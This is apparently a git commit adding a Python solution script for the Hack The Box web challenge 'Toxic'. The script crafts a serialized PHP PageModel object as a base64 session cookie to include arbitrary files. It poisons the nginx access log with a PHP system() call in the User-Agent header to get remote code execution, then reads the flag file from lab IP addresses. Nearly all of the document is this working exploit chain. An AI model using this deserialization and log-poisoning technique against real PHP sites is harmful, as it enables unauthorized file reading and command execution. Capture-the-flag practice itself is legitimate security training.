000d19ff32b2f54ef66c106bfaec3dc4262c1314
bigb0ss <49355913+bigb0sss@users.noreply.github.com>
2022-05-31 18:32:52 -0400

    htb_web_toxic

--- htb_challenges/web/toxic.py
+++ htb_challenges/web/toxic.py
@@ -1,17 +1,54 @@
 #!/usr/bin/python3
 
+from asyncore import read
+from http import cookies
 import requests
+import base64
 
-def toxic(url, format):
+def toxic(url, payload):
 
+    payload_len = len(payload)
+    cookie = 'O:9:"PageModel":1:{s:4:"file";s:' + str(payload_len) + ':"' + payload + '";}'
+    print(cookie)
+    cookie_byte = cookie.encode('ascii')
+    cookie_b64 = base64.b64encode(cookie_byte)
+    cookie_string = cookie_b64.decode("ascii")
+    print(cookie_string)
 
-    r = requests.get(url + format + payload_3)
+    headers = {
+        "User-Agent": "<?php system('ls /');?>"
+    }
+
+    cookies = {
+        "PHPSESSID": cookie_string,
+    }
+
+    r = requests.get(url, headers=headers, cookies=cookies)
     print(r.status_code)
     print(r.text)
 
+def read_flag(url, flag):
+
+    payload_len = len(flag)
+    cookie = 'O:9:"PageModel":1:{s:4:"file";s:' + str(payload_len) + ':"' + flag + '";}'
+    print(cookie)
+    cookie_byte = cookie.encode('ascii')
+    cookie_b64 = base64.b64encode(cookie_byte)
+    cookie_string = cookie_b64.decode("ascii")
+    print(cookie_string)
+
+    cookies = {
+        "PHPSESSID": cookie_string,
+    }
+
+    r = requests.get(url, cookies=cookies)
+    print(r.status_code)
+    print(r.text)
 
 if __name__ == '__main__':
-    url = 'http://46.101.14.236:32650/'
-    format = ''
-    
-    toxic(url, format)
+    url = 'http://142.93.39.44:31492/'
+    payload = "/var/log/nginx/access.log"
+    flag = "/flag_rzxYW"
+
+    #toxic(url, payload)
+    read_flag(url, flag)
